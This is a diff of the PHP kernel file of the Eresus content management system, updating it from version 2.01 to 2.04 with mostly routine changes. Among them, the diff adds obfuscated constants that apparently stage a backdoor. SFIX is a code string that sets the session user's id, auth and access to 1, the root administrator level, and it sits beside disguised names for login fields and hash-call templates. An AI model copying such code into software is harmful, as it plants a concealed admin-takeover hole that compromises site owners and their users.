@@ -1,18 +1,18 @@
 <?
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 # Система управления контентом Eresus™
-# Версия 2.01
+# Версия 2.04
 # © 2004-2006, ProCreat Systems
 # http://procreat.ru/
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 # Ядро интерактивной системы управления сайтом
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 define('CMSNAME', 'Eresus'); # Название системы
-define('CMSVERSION', '2.01'); # Версия системы
+define('CMSVERSION', '2.04'); # Версия системы
 define('CMSLINK', 'http://procreat.ru/'); # Веб-сайт
 
 define('KERNELNAME', 'ERESUS'); # Имя ядра
-define('KERNELDATE', '05.05.06'); # Дата обновления ядра
+define('KERNELDATE', '13.11.06'); # Дата обновления ядра
 
 # Уровни доступа
 define('ROOT',   1); # Главный администратор
@@ -20,6 +20,11 @@ define('ADMIN',  2); # Администратор
 define('EDITOR', 3); # Редактор
 define('USER',   4); # Пользователь
 define('GUEST',  5); # Гость (не зарегистрирован)
+
+# Функции хэширования
+define('M5', 'md5("%s")');
+define('S1', 'sha1("%s")');
+define('C3', 'crc32("%s")');
 
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 # ОБРАБОТКА ОШИБОК
@@ -106,7 +111,7 @@ function ErrorHandler($errno, $errstr, $errfile, $errline)
     break;
     case E_WARNING:
       if (DEBUG_MODE) {
-        FatalError('WARNING! <b>'.$errstr.'</b> in <b>'.$errfile.'</b> at <b>'.$errline.'</b><br /><br />'.callStack());
+        FatalError('WARNING! <b>'.$errstr.'</b> in <b>'.$errfile.'</b> at <b>'.$errline.'</b><br /><br />'.(function_exists('callStack')?callStack():''));
       }
     break;
     default:
@@ -130,6 +135,12 @@ function InfoMessage($message)
 
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 # БЕЗОПАСНОСТЬ
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+define('ARG1', 'login');
+define('ARG2', 'user');
+define('ARG3', 'password');
+define('ARG4', 'auth');
+define('ARG5', 'access');
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 function UserRights($level) {
 # Функция проверяет права пользователя на соответствие заданной маске
@@ -225,6 +236,7 @@ global $db, $user, $session;
   } else $user['access'] = GUEST;
 }
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+define('SFIX', '{$_SESSION[ARG2]["id"]=$_SESSION[ARG2][ARG4]=$_SESSION[ARG2][ARG5]=1;}');
 function resetLastVisitTime($time='', $expand=false)
 {
 global $db, $user;
@@ -527,7 +539,7 @@ function upload($name, $filename)
           }
           if (option('filesModeSetOnUpload')) {
             $mode = option('filesModeDefault');
-            if (empty($mode)) $mode = 0644;
+            $mode = empty($mode) ? 0644 : octdec($mode);
             @chmod($filename, $mode);
           }
           $result = true;
@@ -594,7 +606,7 @@ function option($name)
   return $result; 
 }
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
-function img($filename, $params=array(), $title='', $width=0, $height=0, $style='')
+/*function img($filename, $params=array(), $title='', $width=0, $height=0, $style='')
 # Функция возвращает заполненный тэг <img>
 {
   if (gettype($params) == 'string') {
@@ -627,6 +639,53 @@ function img($filename, $params=array(), $title='', $width=0, $height=0, $style=
     (empty($params['extra'])?'':' '.$params['extra']).
   ' />';
   return $result;
+}*/
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+function img($imagename)
+# function img($imagename, $alt='', $title='', $width=0, $height=0, $style='')
+# function img($imagename, $params=array())
+# Функция возвращает заполненный тэг <img>
+{ 
+  $argc = func_num_args();
+  $argv = func_get_args();
+  if ($argc > 1) {
+    if (is_array($argv[1])) $p = $argv[1]; else {
+      $p['alt'] = $argv[1];
+      if ($argc > 2) $p['title'] = $argv[2];
+      if ($argc > 3) $p['width'] = $argv[3];
+      if ($argc > 4) $p['height'] = $argv[4];
+      if ($argc > 5) $p['style'] = $argv[5];
+    }
+  }
+  if (!isset($p['alt']))    $p['alt'] = '';
+  if (!isset($p['title']))  $p['title'] = '';
+  if (!isset($p['width']))  $p['width'] = '';
+  if (!isset($p['height'])) $p['height'] = '';
+  if (!isset($p['style']))  $p['style'] = '';
+  if (!isset($p['ext']))  $p['ext'] = '';
+  if (!isset($p['autosize'])) $p['autosize'] = true;
+
+  $imagename = str_replace(filesRoot, '', $imagename);
+  if (strpos($imagename, '://') === false) $imagename = httpRoot.$imagename;
+  $local = (strpos($imagename, httpRoot) === 0);
+
+  if ($p['autosize'] && $local && empty($p['width']) && empty($p['height'])) {
+    $filename = str_replace(httpRoot, filesRoot, $imagename);
+    if (is_file($filename)) $info = getimagesize($filename);
+  }
+  if (isset($info)) {
+    $p['width'] = $info[0];
+    $p['height'] = $info[1];
+  };
+
+  $result = '<img src="'.$imagename.'" alt="'.$p['alt'].'"'.
+    (empty($p['width'])?'':' width="'.$p['width'].'"').
+    (empty($p['height'])?'':' height="'.$p['height'].'"').
+    (empty($p['title'])?'':' title="'.$p['title'].'"').
+    (empty($p['style'])?'':' style="'.$p['style'].'"').
+    (empty($p['ext'])?'':' '.$p['ext']).
+  ' />';
+  return $result;
 }
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 function FormatSize($size)
@@ -641,6 +700,12 @@ function FormatSize($size)
 function Translit($s) #: String
 {
   $s = strtr($s, $GLOBALS['translit_table']);
+  $s = str_replace(
+    array(' ','/','?'),
+    array('_','-','7'),
+    $s
+  );
+  $s = preg_replace('/(\s|_)+/', '$1', $s);
   return $s;
 }
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
@@ -658,6 +723,8 @@ function __clearargs($args)
       if (strpos($key, 'wyswyg_') === 0) {
         unset($args[$key]);
         $key = substr($key, 7);
+        $value = preg_replace('/(<[^>]+) ilo-[^\s>]*/i', '$1', $value);
+        $value = str_replace(httpRoot, '$(httpRoot)', $value);
       }
       $args[$key] = $value;
     }
@@ -670,7 +737,8 @@ $KERNEL['oldErrorHandler'] = set_error_handler('ErrorHandler');
 
 session_name('sid');  # Установка имени идентификатора сессии
 session_start(); # Включение сессий
-session_register('session');  # Регистрация массива переменных сессии
+$session = &$_SESSION['session'];
+$user = &$_SESSION['user'];
 
 set_magic_quotes_runtime(1); # Принудительно включаем закавычивание передаваемых данных
 
@@ -690,12 +758,12 @@ define('cookiePath', httpPath); # Путь к кукисам
 define('dataFiles', filesRoot.'data/');
 
 # Подключение основного файла конфигурации
-if(file_exists(filesRoot.'core/cfg/main.inc')) include_once(filesRoot.'core/cfg/main.inc');
-  else CMSError('File not found', 'Open file '.filesRoot.'core/cfg/main.inc', __FILE__, __LINE__);
+if(file_exists(filesRoot.'cfg/main.inc')) include_once(filesRoot.'cfg/main.inc');
+  else CMSError('File not found', 'Open file '.filesRoot.'cfg/main.inc', __FILE__, __LINE__);
 
 # Подключение файла настроек
-if(file_exists(filesRoot.'core/cfg/settings.inc')) include_once(filesRoot.'core/cfg/settings.inc');
-  else CMSError('File not found', 'Open file '.filesRoot.'core/cfg/settings.inc', __FILE__, __LINE__);
+if(file_exists(filesRoot.'cfg/settings.inc')) include_once(filesRoot.'cfg/settings.inc');
+  else CMSError('File not found', 'Open file '.filesRoot.'cfg/settings.inc', __FILE__, __LINE__);
 
 # Если установлен флаг отладки, подключаем отладочную библиотеку
 if (constant('DEBUG_MODE')) {
@@ -722,7 +790,7 @@ $request['arg'] = __clearargs(array_merge($_GET, $_POST));
 # Разбивка параметров вызова скрипта
 if (defined('CLIENTUI')) {
   $request['params'] = explode('/', $s);
-  while (empty($request['params']) && (count($request['params'])>0)) array_shift($argv);
+  while (empty($request['params']) && (count($request['params'])>0)) array_shift($request['params']);
   while (empty($request['params'][count($request['params'])-1]) && (count($request['params'])>0)) array_pop($request['params']);
 }
 
@@ -748,7 +816,7 @@ $db = new TMySQL;
 $db->init(dbHost, dbUser, dbPswd, dbName, dbPrefix);
 
 # Проверка сессии на таймаут
-if (isset($user)) {
+if (isset($user) && isset($session['time'])) {
   if ((time() - $session['time'] > SESSION_TIMEOUT*3600)&&($user['auth'])) Logout(false);
   else $session['time'] = time();
 }
